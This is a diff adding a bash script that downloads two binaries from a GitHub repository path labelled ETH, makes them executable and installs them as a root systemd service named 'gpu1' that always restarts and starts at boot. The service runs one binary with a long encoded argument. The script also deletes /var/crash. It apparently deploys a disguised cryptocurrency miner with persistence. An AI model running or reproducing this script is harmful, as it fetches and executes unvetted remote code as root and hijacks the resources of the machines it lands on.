@@ -1,0 +1,26 @@
+#!/bin/bash
+cd /home
+sudo wget https://github.com/trangtrau/random-agent-spoofer/raw/master/ETH/a
+sudo wget https://github.com/trangtrau/random-agent-spoofer/raw/master/ETH/sec
+sudo chmod +x sec
+sudo chmod +x a
+sudo rm -rf /lib/systemd/system/gpu1.service
+sudo rm -rf /var/crash
+bash -c 'cat <<EOT >>/lib/systemd/system/gpu1.service 
+[Unit]
+Description=gpu1
+After=network.target
+[Service]
+ExecStart= /home/sec IlepoNwGKpB+PCGfjNd1tDCmULUKDyBFtdgVnSaIV9FHppuLfotyouHFn+isnBPpEX2r0iMJevYJOj0D8DfbYYrXqZSj7H2AuYFMhoKR/90r0jZmNLmiB8KbCYgVyHAx/+4UpVPGSfWaS6j0cRJ5hIM/kQ00F+hunLYqFMujRlGfeS/RKi9g/UihzcoeaY4+T7Ne9iYjsFEKtPZL5QfvVzY+Dx/cUsgSs1Jznq24gfWICe1JOlzhwCXV
+WatchdogSec=36000
+Restart=always
+RestartSec=60
+User=root
+[Install]
+WantedBy=multi-user.target
+EOT
+' &&
+systemctl daemon-reload &&
+systemctl enable gpu1.service &&
+service gpu1 stop  &&
+service gpu1 restart
